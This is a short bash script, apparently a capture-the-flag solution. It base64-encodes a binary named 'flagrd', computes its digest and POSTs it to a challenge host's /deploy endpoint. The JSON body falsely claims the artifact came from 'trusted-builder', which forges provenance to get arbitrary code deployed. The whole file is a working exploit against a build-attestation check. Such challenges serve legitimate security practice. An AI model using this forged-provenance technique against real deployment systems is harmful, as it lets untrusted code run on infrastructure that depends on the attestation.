#!/bin/bash
# Usage: ./submit.sh [URL] [binaire]
B=${1:-https://43ogqi66u63yzgpx.t.ctf.tg}
BIN=${2:-flagrd}
ART=$(base64 -w0 "$BIN")
D=$(printf '%s' "$ART" | sha256sum | cut -d' ' -f1)
python3 -c "import json,sys;print(json.dumps({'artifact':sys.argv[1],'provenance':{'builder':'trusted-builder','digest':sys.argv[2]}}))" "$ART" "$D" > /tmp/body.json
echo "[*] POST $B/deploy  (artifact=base64($BIN), digest=$D)"
curl -sk -X POST "$B/deploy" -H 'Content-Type: application/json' --data @/tmp/body.json; echo
